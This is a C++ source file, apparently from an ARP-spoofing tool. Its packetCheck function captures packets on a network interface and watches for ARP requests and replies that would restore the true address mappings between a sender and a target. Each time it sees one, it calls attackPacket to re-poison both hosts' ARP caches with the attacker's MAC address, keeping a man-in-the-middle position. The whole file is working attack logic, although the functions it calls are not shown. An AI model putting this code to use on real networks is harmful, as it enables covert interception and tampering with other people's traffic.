#include "packetCheck.h"

void packetCheck(char* dev, STMacIp SDIp, STMacIp TGIp, AttackerMacIp AttMacIp, char* senderIp, char* targetIp) {
    struct pcap_pkthdr* header;
    const uint8_t* recv_packet;
    char errbuf[PCAP_ERRBUF_SIZE];

	pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (pcap == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		exit(0);
	}

    while (true){
		int recv_res = pcap_next_ex(pcap, &header, &recv_packet);
		if ((recv_res == PCAP_ERROR) || (recv_res == PCAP_ERROR_BREAK)) {
			printf("pcap_next_ex return %d(%s)\n", recv_res, pcap_geterr(pcap));
			break;
		}
        const EthHdr* ethHdr = reinterpret_cast<const EthHdr*>(recv_packet);
        if (ntohs(ethHdr->type_) == EthHdr::Arp) {
            const ArpHdr* arpHdr = reinterpret_cast<const ArpHdr*>(recv_packet+sizeof(EthHdr));
            if (arpHdr->op_==ArpHdr::Reply) {
                if ((uint32_t(arpHdr->sip_) == htonl(Ip(targetIp))) && (uint32_t(arpHdr->tip_) == htonl(Ip(senderIp)))) {
                    attackPacket(pcap, SDIp, AttMacIp, senderIp, targetIp);
                    attackPacket(pcap, TGIp, AttMacIp, targetIp, senderIp);
                }
            }
            else if (arpHdr->op_==ArpHdr::Request) {
                if (ethHdr->smac_ == Mac(SDIp.mac) && ethHdr->dmac_ == Mac("FF:FF:FF:FF:FF:FF")) {
                    attackPacket(pcap, SDIp, AttMacIp, senderIp, targetIp);
                    attackPacket(pcap, TGIp, AttMacIp, targetIp, senderIp);
                }
                else if ((uint32_t(arpHdr->sip_) == htonl(Ip(targetIp))) && (uint32_t(arpHdr->tip_) == htonl(Ip(senderIp)))) {
                    attackPacket(pcap, SDIp, AttMacIp, senderIp, targetIp);
                    attackPacket(pcap, TGIp, AttMacIp, targetIp, senderIp);
                }
            }
        }    
	}
}